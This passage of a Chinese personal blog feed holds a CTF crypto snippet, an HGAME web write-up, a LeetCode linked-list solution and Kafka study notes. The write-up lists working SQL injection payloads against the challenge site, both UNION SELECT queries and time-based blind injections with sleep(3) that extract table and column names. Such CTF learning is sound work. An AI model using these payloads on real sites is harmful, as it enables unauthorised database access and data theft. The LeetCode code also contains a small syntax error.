class="built_in">hex</span>(M)).replace(<span class="string">&#x27;0x&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"><span class="comment"># m = str(hex(M)).replace(&#x27;0x&#x27;, &#x27;&#x27;)</span></span><br><span class="line"><span class="comment"># print(m)</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(m)//<span class="number">2</span>):</span><br><span class="line">    flag += <span class="built_in">chr</span>(<span class="built_in">int</span>(m[<span class="number">2</span>*i]+m[<span class="number">2</span>*i+<span class="number">1</span>], <span class="number">16</span>))</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h4 id="sqli-1"><a href="#sqli-1" class="headerlink" title="sqli-1"></a>sqli-1</h4><p>刚点进去有个md5要我绕过，在请教大佬之后知道可以爆破，用我之前爬虫题里的学的一点点正则匹配下来code，不断爆破……</p>
<p>我看了一些网上的教程，这题我一开始都不知道要输入啥，只能猜数字了</p>
<p>1.0，1，2，3，4一直猜，注出来个welcome to hgame</p>
<p>2.0 union select database()    数据库名字是hgame</p>
<p>3.0 union select table_name from information_schema.tables where table_schema=’hgame’</p>
<p>出来表名 f1l1l1l1g 和 words</p>
<p>4.0 union select * from f1l1l1l1g 得到flag</p>
<h4 id="sqli-2（未完成）"><a href="#sqli-2（未完成）" class="headerlink" title="sqli-2（未完成）"></a>sqli-2（未完成）</h4><p>输啥都没反应，问了下出题人要爆破databse或者table，存在⼀个execute和error的提示</p>
<p>去理解了一下sleep的手法</p>
<p>另外从网上学到了一个姿势：ascii(substr((select table_name information_schema.tables where tables_schema=database()limit 0,1),1,1))=101</p>
<p>链接：<a href="https://www.cnblogs.com/lcamry/p/5763129.html">https://www.cnblogs.com/lcamry/p/5763129.html</a></p>
<p>payload: 1 and if((ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)))=%d,sleep(3),1)</p>
<p>试试看合在爆破脚本里怎么用，code变太快了，我失败了，坐等wp，纯手工来一波……</p>
<p>记录一下成功的语句：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1 and if((ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)))=70,sleep(3),1)</span><br><span class="line"></span><br><span class="line">11 and if((ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),2,1)))=49,sleep(3),1)</span><br><span class="line"></span><br><span class="line">1 and if((ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),3,1)))=49,sleep(3),1)</span><br><span class="line"></span><br><span class="line">1 and if((ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),4,1)))=49,sleep(3),1)</span><br><span class="line"></span><br><span class="line">1 and if((ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),5,1)))=49,sleep(3),1)</span><br><span class="line"></span><br><span class="line">1 and if((ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),6,1)))=49,sleep(3),1)</span><br><span class="line"></span><br><span class="line">1 and if((ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),7,1)))=49,sleep(3),1)</span><br><span class="line"></span><br><span class="line">1 and if((ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),8,1)))=49,sleep(3),1)</span><br><span class="line"></span><br><span class="line">1 and if((ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),9,1)))=52,sleep(3),1)</span><br><span class="line"></span><br><span class="line">1 and if((ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),10,1)))=71,sleep(3),1)</span><br></pre></td></tr></table></figure>

<p>table_name: F11111114G</p>
<p>不想猜列名了，直接select * 搏一搏，单车变摩托，不行，告辞，来段名，中间还是用了二分法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1 and if(ascii(substr((select column_name from information_schema.columns where table_name=&#x27;F11111114G&#x27; limit 0,1),1,1))=102,sleep(3),1)</span><br><span class="line"></span><br><span class="line">1 and if(ascii(substr((select column_name from information_schema.columns where table_name=&#x27;F11111114G&#x27; limit 0,1),2,1))=76,sleep(3),1)</span><br><span class="line"></span><br><span class="line">1 and if(ascii(substr((select column_name from information_schema.columns where table_name=&#x27;F11111114G&#x27; limit 0,1),3,1))=52,sleep(3),1)</span><br><span class="line"></span><br><span class="line">1 and if(ascii(substr((select column_name from information_schema.columns where table_name=&#x27;F11111114G&#x27; limit 0,1),4,1))=52,sleep(3),1)</span><br><span class="line"></span><br><span class="line">1 and if(ascii(substr((select column_name from information_schema.columns where table_name=&#x27;F11111114G&#x27; limit 0,1),5,1))=52,sleep(3),1)</span><br><span class="line"></span><br><span class="line">1 and if(ascii(substr((select column_name from information_schema.columns where table_name=&#x27;F11111114G&#x27; limit 0,1),6,1))=52,sleep(3),1)</span><br><span class="line"></span><br><span class="line">1 and if(ascii(substr((select column_name from information_schema.columns where table_name=&#x27;F11111114G&#x27; limit 0,1),7,1))=65,sleep(3),1)</span><br></pre></td></tr></table></figure>

<p>colum_name:fL4444G，还最后一步了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1 and if(ascii(substr((select * from F11111114G limit 0,1),1,1))=104,sleep(3),1)</span><br><span class="line"></span><br><span class="line">1 and if(ascii(substr((select * from F11111114G limit 0,1),1,1))=104,sleep(3),1)</span><br></pre></td></tr></table></figure>

<p>hgame，我投降了</p>
]]></content>
      <tags>
        <tag>ctf</tag>
        <tag>hgame</tag>
      </tags>
  </entry>
  <entry>
    <title>leetcode_两数相加</title>
    <url>/2019/02/05/leetcode-%E4%B8%A4%E6%95%B0%E7%9B%B8%E5%8A%A0/</url>
    <content><![CDATA[<p>首先申明，自己是打算练一下python和一些基础的编程技巧才做的，如果是c纯算法的话我可吃不消</p>
<span id="more"></span>

<h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>给出两个 <strong>非空</strong> 的链表用来表示两个非负的整数。其中，它们各自的位数是按照 <strong>逆序</strong> 的方式存储的，并且它们的每个节点只能存储 <strong>一位</strong> 数字。</p>
<p>如果，我们将这两个数相加起来，则会返回一个新的链表来表示它们的和。</p>
<p>您可以假设除了数字 0 之外，这两个数都不会以 0 开头。</p>
<p><strong>示例：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：(2 -&gt; 4 -&gt; 3) + (5 -&gt; 6 -&gt; 4)</span><br><span class="line">输出：7 -&gt; 0 -&gt; 8</span><br><span class="line">原因：342 + 465 = 807</span><br></pre></td></tr></table></figure>

<p>这题首先让我困扰的就是python怎么写链表，和c不一样,python没有专门的指针概念,在python中每个变量都是指针，隐式地包含了指向/嵌套关系</p>
<p>结合了一些网上的分析，最后好的办法是创建一个类，链接如下：</p>
<p><a href="https://blog.csdn.net/hjxu2016/article/details/79714783">https://blog.csdn.net/hjxu2016/article/details/79714783</a> ；</p>
<p><a href="https://www.cnblogs.com/yuanmingzhou/p/9661152.html">https://www.cnblogs.com/yuanmingzhou/p/9661152.html</a></p>
<h3 id="定义ListNode节点"><a href="#定义ListNode节点" class="headerlink" title="定义ListNode节点"></a>定义ListNode节点</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ListNode</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    __slots__ = (<span class="string">&#x27;item&#x27;</span>, <span class="string">&#x27;next&#x27;</span>)  </span><br><span class="line">    <span class="comment"># 仅允许绑定这两个属性，__slots__定义的属性仅对当前类起作用，对继承的子类是不起作用</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, item</span>):</span></span><br><span class="line">        self.item = item</span><br><span class="line">        self.<span class="built_in">next</span> = <span class="literal">None</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">getItem</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> self.item</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">getNext</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> self.<span class="built_in">next</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">setItem</span>(<span class="params">self, newitem</span>):</span></span><br><span class="line">        self.item = newitem</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">setNext</span>(<span class="params">self, newnext</span>):</span></span><br><span class="line">        self.<span class="built_in">next</span> = newnext</span><br></pre></td></tr></table></figure>

<h3 id="定义SinglelinkedList单向链表"><a href="#定义SinglelinkedList单向链表" class="headerlink" title="定义SinglelinkedList单向链表"></a>定义SinglelinkedList单向链表</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SingleLinkedList</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self._head = <span class="literal">None</span>  <span class="comment"># 初始化链表为空表</span></span><br><span class="line">        self._size = <span class="number">0</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">isEmpty</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> self._head == <span class="literal">None</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">self, item</span>):</span>   <span class="comment"># 在链表前端添加Node</span></span><br><span class="line">        temp = ListNode(item)</span><br><span class="line">        temp.setNext(self._head)</span><br><span class="line">        self._head = temp</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">append</span>(<span class="params">self, item</span>):</span>  <span class="comment"># 在链表末尾添加Node</span></span><br><span class="line">        temp = ListNode(item)</span><br><span class="line">        <span class="keyword">if</span> self.isEmpty():</span><br><span class="line">            self._head = temp</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            current = self._head</span><br><span class="line">            <span class="keyword">while</span> current.getNext() != <span class="literal">None</span>:</span><br><span class="line">                current = current.getNext()</span><br><span class="line">            current.setNext(temp)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">serach</span>(<span class="params">self, item</span>):</span>   <span class="comment"># 在链表中搜索Node</span></span><br><span class="line">        current = self._head</span><br><span class="line">        flag = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">while</span> current != <span class="literal">None</span> <span class="keyword">and</span> <span class="keyword">not</span> flag:</span><br><span class="line">            <span class="keyword">if</span> current.getItem() == item:</span><br><span class="line">                flag = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                current = current.getNext()</span><br><span class="line">        <span class="keyword">return</span> flag</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">index</span>(<span class="params">self, item</span>):</span>  <span class="comment"># 检测索引位置</span></span><br><span class="line">        current = self._head</span><br><span class="line">        count = <span class="number">0</span></span><br><span class="line">        found = <span class="literal">None</span></span><br><span class="line">        <span class="keyword">while</span> current != <span class="literal">None</span> <span class="keyword">and</span> <span class="keyword">not</span> found:</span><br><span class="line">            count += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> current.getItem() == item:</span><br><span class="line">                found = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                current = current.getNext()</span><br><span class="line">        <span class="keyword">if</span> found:</span><br><span class="line">            <span class="keyword">return</span> count</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&#x27;Not fond &#123;item&#125;&#x27;</span>.<span class="built_in">format</span>(item=item))</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">remove</span>(<span class="params">self, item</span>):</span>   <span class="comment"># 在链表中删除Node</span></span><br><span class="line">        current = self._head</span><br><span class="line">        pre = <span class="literal">None</span></span><br><span class="line">        <span class="keyword">while</span> current != <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">if</span> current.getItem() == item:</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> pre:</span><br><span class="line">                    self._head = current.getNext()</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    pre.setNext(current.getNext())</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                pre = current</span><br><span class="line">                current = current.getNext()</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">insert</span>(<span class="params">self, pos, item</span>):</span>  <span class="comment"># 插入元素</span></span><br><span class="line">        current = self._head</span><br><span class="line">        <span class="keyword">if</span> pos == <span class="number">1</span>:</span><br><span class="line">            self.add(item)</span><br><span class="line">        <span class="keyword">if</span> pos &lt; <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&#x27;pos must not less than 1&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            temp = ListNode(item)</span><br><span class="line">            count = <span class="number">1</span></span><br><span class="line">            pre = <span class="literal">None</span></span><br><span class="line">            current = self._head</span><br><span class="line">            <span class="keyword">while</span> count &lt; pos:</span><br><span class="line">                count += <span class="number">1</span></span><br><span class="line">                pre = current</span><br><span class="line">                <span class="keyword">if</span> current.getNext():</span><br><span class="line">                    current = current.getNext()</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">raise</span> ValueError(<span class="string">&#x27;pos is too big&#x27;</span>)</span><br><span class="line">            pre.setNext(temp)</span><br><span class="line">            temp.setNext(current)</span><br></pre></td></tr></table></figure>

<h3 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h3><p>题目其实是给了部分定义的，我们可以省力不少</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># leetcode</span></span><br><span class="line"><span class="comment"># Definition for singly-linked list.</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ListNode</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, x</span>):</span></span><br><span class="line">        self.val = x</span><br><span class="line">        self.<span class="built_in">next</span> = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">addTwoNumbers</span>(<span class="params">self, l1, l2</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        :type l1: ListNode</span></span><br><span class="line"><span class="string">        :type l2: ListNode</span></span><br><span class="line"><span class="string">        :rtype: ListNode</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        p = ListNode(<span class="number">0</span>)</span><br><span class="line">        pos = p</span><br><span class="line">        carry = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span>(l1 <span class="keyword">or</span> l2):</span><br><span class="line">            x = l1.val <span class="keyword">if</span> l1 <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">            y = l2.val <span class="keyword">if</span> l2 <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">            s = carry +x + y</span><br><span class="line">            carry = s // <span class="number">10</span>  <span class="comment"># carry 表示是否有进位</span></span><br><span class="line">            pos.<span class="built_in">next</span> = ListNode(s%<span class="number">10</span>)</span><br><span class="line">            pos = pos.<span class="built_in">next</span></span><br><span class="line">            <span class="keyword">if</span> l1 != <span class="literal">None</span>:</span><br><span class="line">                l1 = l1.<span class="built_in">next</span></span><br><span class="line">            ifl2 != <span class="literal">None</span>:</span><br><span class="line">                l2 = l2.<span class="built_in">next</span></span><br><span class="line">        <span class="keyword">if</span> carry &gt; <span class="number">0</span>:</span><br><span class="line">            pos.<span class="built_in">next</span> = ListNode(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> p.<span class="built_in">next</span></span><br></pre></td></tr></table></figure>

<p>最后其实不断地p.next是可以从低位到高位全部输出的，主要的收获就是python可能弄个节点的类，之前没试过</p>
]]></content>
      <tags>
        <tag>python</tag>
        <tag>leetcode</tag>
      </tags>
  </entry>
  <entry>
    <title>kafka学习记录</title>
    <url>/2021/08/15/kafka%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<p><a href="https://time.geekbang.org/column/article/99318">学习链接：极客时间</a></p>
<p>Kafka 学习笔记</p>
<span id="more"></span>

<h2 id="入门概念"><a href="#入门概念" class="headerlink" title="入门概念"></a>入门概念</h2><h3 id="术语"><a href="#术语" class="headerlink" title="术语"></a>术语</h3><p>Kafka 的三层消息架构：</p>
<ul>
<li>第一层是主题层，每个主题可以配置 M 个分区，而每个分区又可以配置 N 个副本。</li>
<li>第二层是分区层，每个分区的 N 个副本中只能有一个充当领导者角色，对外提供服务；其他 N-1 个副本是追随者副本，只是提供数据冗余之用。</li>
<li>第三层是消息层，分区中包含若干条消息，每条消息的位移从 0 开始，依次递增。</li>
<li>最后，客户端程序只能与分区的领导者副本进行交互。</li>
</ul>
<p>Kafka Broker 是如何持久化数据的：</p>
<p>总的来说，Kafka 使用消息日志（Log）来保存数据，一个日志就是磁盘上一个只能追加写（Append-only）消息的物理文件。因为只能追加写入，故避免了缓慢的随机 I/O 操作，改为性能较好的顺序 I/O 写操作，这也是实现 Kafka 高吞吐量特性的一个重要手段。不过如果你不停地向一个日志写入消息，最终也会耗尽所有的磁盘空间，因此 Kafka 必然要定期地删除消息以回收磁盘。怎么删除呢？简单来说就是通过日志段（Log Segment）机制。在 Kafka 底层，一个日志又进一步细分成多个日志段，消息被追加写到当前最新的日志段中，当写满了一个日志段后，Kafka 会自动切分出一个新的日志段，并将老的日志段封存起来。Kafka 在后台还有定时任务会定期地检查老的日志段是否能够被删除，从而实现回收磁盘空间的目的。</p>
<p>消费者组（Consumer Group）：</p>
<p>所谓的消费者组，指的是多个消费者实例共同组成一个组来消费一组主题。这组主题中的每个分区都只会被组内的一个消费者实例消费，其他消费者实例不能消费它。为什么要引入消费者组呢？主要是为了提升消费者端的吞吐量。多个消费者实例同时消费，加速整个消费端的吞吐量（TPS）。我会在专栏的后面详细介绍消费者组机制，所以现在你只需要了解消费者组是做什么的即可。另外这里的消费者实例可以是运行消费者应用的进程，也可以是一个线程，它们都称为一个消费者实例（Consumer Instance）。</p>
<p>重平衡（Rebalance）：</p>
<p>消费者组里面的所有消费者实例不仅“瓜分”订阅主题的数据，而且更酷的是它们还能彼此协助。假设组内某个实例挂掉了，Kafka 能够自动检测到，然后把这个 Failed 实例之前负责的分区转移给其他活着的消费者。这个过程就是 Kafka 中大名鼎鼎的“重平衡”（Rebalance）。</p>
<p>所有名词术语：</p>
<ul>
<li>消息：Record。Kafka 是消息引擎嘛，这里的消息就是指 Kafka 处理的主要对象。</li>
<li>主题：Topic。主题是承载消息的逻辑容器，在实际使用中多用来区分具体的业务。</li>
<li>分区：Partition。一个有序不变的消息序列。每个主题下可以有多个分区。</li>
<li>消息位移：Offset。表示分区中每条消息的位置信息，是一个单调递增且不变的值。</li>
<li>副本：Replica。Kafka 中同一条消息能够被拷贝到多个地方以提供数据冗余，这些地方就是所谓的副本。副本还分为领导者副本和追随者副本，各自有不同的角色划分。副本是在分区层级下的，即每个分区可配置多个副本实现高可用。</li>
<li>生产者：Producer。向主题发布新消息的应用程序。</li>
<li>消费者：Consumer。从主题订阅新消息的应用程序。</li>
<li>消费者位移：Consumer Offset。表征消费者消费进度，每个消费者都有自己的消费者位移。</li>
<li>消费者组：Consumer Group。多个消费者实例共同组成的一个组，同时消费多个分区以实现高吞吐。</li>
<li>重平衡：Rebalance。消费者组内某个消费者实例挂掉后，其他消费者实例自动重新分配订阅主题分区的过程。Rebalance 是 Kafka 消费者端实现高可用的重要手段。</li>
</ul>
<p><img src="https://kafka.apachecn.org/10/images/consumer-groups.png" alt="image-20210809175542973"></p>
<h3 id="kafka-只是消息引擎么"><a href="#kafka-只是消息引擎么" class="headerlink" title="kafka 只是消息引擎么"></a>kafka 只是消息引擎么</h3><p>Kafka 在设计之初就旨在提供三个方面的特性：</p>
<ul>
<li>提供一套 API 实现生产者和消费者；</li>
<li>降低网络传输和磁盘存储开销；</li>
<li>实现高伸缩性架构。</li>
</ul>
<h2 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h2><h3 id="Broker-端参数"><a href="#Broker-端参数" class="headerlink" title="Broker 端参数"></a>Broker 端参数</h3><h4 id="存储信息"><a href="#存储信息" class="headerlink" title="存储信息"></a>存储信息</h4><p>首先 Broker 是需要配置存储信息的，即 Broker 使用哪些磁盘。那么针对存储信息的重要参数有以下这么几个：</p>
<ul>
<li>log.dirs：这是非常重要的参数，指定了 Broker 需要使用的若干个文件目录路径。要知道这个参数是没有默认值的，这说明什么？这说明它必须由你亲自指定。</li>
<li>log.dir：注意这是 dir，结尾没有 s，说明它只能表示单个路径，它是补充上一个参数用的。</li>
</ul>
<p>这两个参数应该怎么设置呢？很简单，你只要设置log.dirs，即第一个参数就好了，不要设置log.dir。而且更重要的是，在线上生产环境中一定要为log.dirs配置多个路径，具体格式是一个 CSV 格式，也就是用逗号分隔的多个路径，比如/home/kafka1,/home/kafka2,/home/kafka3这样。</p>
<h4 id="ZooKeeper-相关的设置"><a href="#ZooKeeper-相关的设置" class="headerlink" title="ZooKeeper 相关的设置"></a>ZooKeeper 相关的设置</h4><p>它是一个分布式协调框架，负责协调管理并保存 Kafka 集群的所有元数据信息，比如集群都有哪些 Broker 在运行、创建了哪些 Topic，每个 Topic 都有多少分区以及这些分区的 Leader 副本都在哪些机器上等信息。</p>
<p>Kafka 与 ZooKeeper 相关的最重要的参数当属zookeeper.connect。这也是一个 CSV 格式的参数，比如我可以指定它的值为zk1:2181,zk2:2181,zk3:2181。2181 是 ZooKeeper 的默认端口。</p>
<p>如果你有两套 Kafka 集群，假设分别叫它们 kafka1 和 kafka2，那么两套集群的zookeeper.connect参数可以这样指定：zk1:2181,zk2:2181,zk3:2181/kafka1和zk1:2181,zk2:2181,zk3:2181/kafka2。切记 chroot 只需要写一次，而且是加到最后的。我经常碰到有人这样指定：zk1:2181/kafka1,zk2:2181/kafka2,zk3:2181/kafka3，这样的格式是不对的。</p>
<h4 id="Topic-管理"><a href="#Topic-管理" class="headerlink" title="Topic 管理"></a>Topic 管理</h4><ul>
<li>auto.create.topics.enable：是否允许自动创建 Topic。</li>
<li>unclean.leader.election.enable：是否允许 Unclean Leader 选举。</li>
<li>auto.leader.rebalance.enable：是否允许定期进行 Leader 选举。</li>
</ul>
<h4 id="数据留存"><a href="#数据留存" class="headerlink" title="数据留存"></a>数据留存</h4><ul>
<li>log.retention.{hours|minutes|ms}：这是个“三兄弟”，都是控制一条消息数据被保存多长时间。从优先级上来说 ms 设置最高、minutes 次之、hours 最低。</li>
<li>log.retention.bytes：这是指定 Broker 为消息保存的总磁盘容量大小。</li>
<li>message.max.bytes：控制 Broker 能够接收的最大消息大小。</li>
</ul>
<h3 id="Topic-级别参数"><a href="#Topic-级别参数" class="headerlink" title="Topic 级别参数"></a>Topic 级别参数</h3><p>答案就是 Topic 级别参数会覆盖全局 Broker 参数的值，而每个 Topic 都能设置自己的参数值，这就是所谓的 Topic 级别参数。</p>
<h4 id="保存消息"><a href="#保存消息" class="headerlink" title="保存消息"></a>保存消息</h4><p>从保存消息方面来考量的话，下面这组参数是非常重要的：</p>
<ul>
<li>retention.ms：规定了该 Topic 消息被保存的时长。默认是 7 天，即该 Topic 只保存最近 7 天的消息。一旦设置了这个值，它会覆盖掉 Broker 端的全局参数值。</li>
<li>retention.bytes：规定了要为该 Topic 预留多大的磁盘空间。和全局参数作用相似，这个值通常在多租户的 Kafka 集群中会有用武之地。当前默认值是 -1，表示可以无限使用磁盘空间。</li>
</ul>
<h4 id="设置方式"><a href="#设置方式" class="headerlink" title="设置方式"></a>设置方式</h4><p>Topic 级别参数的设置就是这种情况，我们有两种方式可以设置：</p>
<ul>
<li>创建 Topic 时进行设置</li>
<li>修改 Topic 时设置</li>
</ul>
<p>现在让我们用以下命令来创建 Topic：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">bin/kafka-topics.sh --bootstrap-server localhost:9092 --create --topic transaction --partitions 1 --replication-factor 1 --config retention.ms=15552000000 --config max.message.bytes=5242880</span><br></pre></td></tr></table></figure>

<p>下面看看使用另一个自带的命令kafka-configs来修改 Topic 级别参数。假设我们现在要发送最大值是 10MB 的消息，该如何修改呢？命令如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">bin/kafka-configs.sh --zookeeper localhost:2181 --entity-type topics --entity-name transaction --alter --add-config max.message.bytes=10485760</span><br></pre></td></tr></table></figure>

<h3 id="JVM-参数"><a href="#JVM-参数" class="headerlink" title="JVM 参数"></a>JVM 参数</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">export KAFKA_HEAP_OPTS=--Xms6g  --Xmx6g</span><br><span class="line">export KAFKA_JVM_PERFORMANCE_OPTS= -server -XX:+UseG1GC -XX:MaxGCPauseMillis=20 -XX:InitiatingHeapOccupancyPercent=35 -XX:+ExplicitGCInvokesConcurrent -Djava.awt.headless=true</span><br><span class="line">bin/kafka-server-start.sh config/server.properties</span><br></pre></td></tr></table></figure>

<h2 id="客户端实践及原理剖析"><a href="#客户端实践及原理剖析" class="headerlink" title="客户端实践及原理剖析"></a>客户端实践及原理剖析</h2><h3 id="生产者消息分区机制原理剖析"><a href="#生产者消息分区机制原理剖析" class="headerlink" title="生产者消息分区机制原理剖析"></a>生产者消息分区机制原理剖析</h3><p><img src="https://static001.geekbang.org/resource/image/a9/51/a9fde3dd19a6ea5dc7e7e3d1f42ffa51.jpg"></p>
<p>其实分区的作用就是提供负载均衡的能力，或者说对数据进行分区的主要原因，就是为了实现系统的高伸缩性（Scalability）。不同的分区能够被放置到不同节点的机器上，而数据的读写操作也都是针对分区这个粒度而进行的，这样每个节点的机器都能独立地执行各自分区的读写请求处理。并且，我们还可以通过添加新的节点机器来增加整体系统的吞吐量。</p>
<h4 id="分区策略"><a href="#分区策略" class="headerlink" title="分区策略"></a>分区策略</h4><p>所谓分区策略是决定生产者将消息发送到哪个分区的算法。Kafka 为我们提供了默认的分区策略，同时它也支持你自定义分区策略。</p>
<p>如果要自定义分区策略，你需要显式地配置生产者端的参数partitioner.class。这个参数该怎么设定呢？方法很简单，在编写生产者程序时，你可以编写一个具体的类实现org.apache.kafka.clients.producer.Partitioner接口。这个接口也很简单，只定义了两个方法：partition()和close()，通常你只需要实现最重要的 partition 方法。我们来看看这个方法的方法签名：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">partition</span><span class="params">(String topic, Object key, <span class="keyword">byte</span>[] keyBytes, Object value, <span class="keyword">byte</span>[] valueBytes, Cluster cluster)</span></span>;</span><br></pre></td></tr></table></figure>

<p>这里的topic、key、keyBytes、value和valueBytes都属于消息数据，cluster则是集群信息（比如当前 Kafka 集群共有多少主题、多少 Broker 等）。</p>
<h4 id="轮询策略"><a href="#轮询策略" class="headerlink" title="轮询策略"></a>轮询策略</h4><p><img src="https://static001.geekbang.org/resource/image/be/e2/bed44c33d6707c0028cc3f14207ea6e2.jpg"></p>
<p>轮询策略有非常优秀的负载均衡表现，它总是能保证消息最大限度地被平均分配到所有分区上，故默认情况下它是最合理的分区策略，也是我们最常用的分区策略之一。</p>
<h4 id="随机策略"><a href="#随机策略" class="headerlink" title="随机策略"></a>随机策略</h4><p><img src="https://static001.geekbang.org/resource/image/97/ff/97fd864312f804bf414001c2f9228aff.jpg"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">List&lt;PartitionInfo&gt; partitions = cluster.partitionsForTopic(topic);</span><br><span class="line"><span class="keyword">return</span> ThreadLocalRandom.current().nextInt(partitions.size());</span><br></pre></td></tr></table></figure>

<h4 id="按消息键保序策略"><a href="#按消息键保序策略" class="headerlink" title="按消息键保序策略"></a>按消息键保序策略</h4><p><img src="https://static001.geekbang.org/resource/image/cf/a8/cf7383078f4c7c022c1113c096d5d5a8.jpg"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">List&lt;PartitionInfo&gt; partitions = cluster.partitionsForTopic(topic);</span><br><span class="line"><span class="keyword">return</span> Math.abs(key.hashCode()) % partitions.size();</span><br></pre></td></tr></table></figure>

<h3 id="生产者压缩算法面面观"><a href="#生产者压缩算法面面观" class="headerlink" title="生产者压缩算法面面观"></a>生产者压缩算法面面观</h3><p>Kafka 的消息层次都分为两层：消息集合（message set）以及消息（message）。一个消息集合中包含若干条日志项（record item），而日志项才是真正封装消息的地方。Kafka 底层的消息日志由一系列消息集合日志项组成。Kafka 通常不会直接操作具体的一条条消息，它总是在消息集合这个层面上进行写入操作</p>
<h4 id="何时压缩？"><a href="#何时压缩？" class="headerlink" title="何时压缩？"></a>何时压缩？</h4><p>在 Kafka 中，压缩可能发生在两个地方：生产者端和 Broker 端。</p>
<p>比如下面这段程序代码展示了如何构建一个开启 GZIP 的 Producer 对象：</p>
